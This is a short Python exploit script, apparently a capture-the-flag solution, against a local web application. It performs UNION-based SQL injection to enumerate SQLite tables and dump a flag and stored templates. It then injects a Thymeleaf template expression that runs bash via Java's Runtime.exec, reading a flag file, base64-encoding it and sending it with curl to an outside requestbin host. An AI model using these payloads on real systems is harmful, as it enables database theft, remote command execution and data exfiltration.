#!/usr/bin/env python3
import binascii
import requests
url = "http://localhost:8080/"

def content(query):
    query = query.replace("+", "%2b").replace("#", "%23").replace("[", "%5b").replace("]", "%5d")
    response = requests.get(url + "?page=whatever&type=' UNION %s-- -" % query)
    return response.text

def enum(column, table):
    for i in range(9999):
        html = content("SELECT %s FROM %s LIMIT 1 OFFSET %d" % (column, table, i))

        if "http-equiv" not in html:
            print(html)
        else:
            break

def enum_hex(column, table):
    for i in range(9999):
        html = content("SELECT HEX(%s) FROM %s LIMIT 1 OFFSET %d" % (column, table, i))

        if "http-equiv" not in html:
            print(binascii.unhexlify(html).decode())
        else:
            break

enum("tbl_name", "SQLITE_MASTER")
print(content("SELECT sql FROM SQLITE_MASTER WHERE tbl_name = 'secret'"))
print(content("SELECT flag FROM secret"))
print(content("SELECT sql FROM SQLITE_MASTER WHERE tbl_name = 'templates'"))
enum_hex("html", "templates")

command = "curl http://requestbin.fullcontact.com/sccykksc?a=$(cat /this_is_a_long_flag_name_very_long | base64 --wrap=0)"
shell_exec = "#strings.class.forName(''java.lang.Runtime'').getRuntime().exec(new String[]{''bash'', ''-c'', ''%s''})" % command

print(content("""SELECT '<p th:text="${%s}" />'""" % (shell_exec)))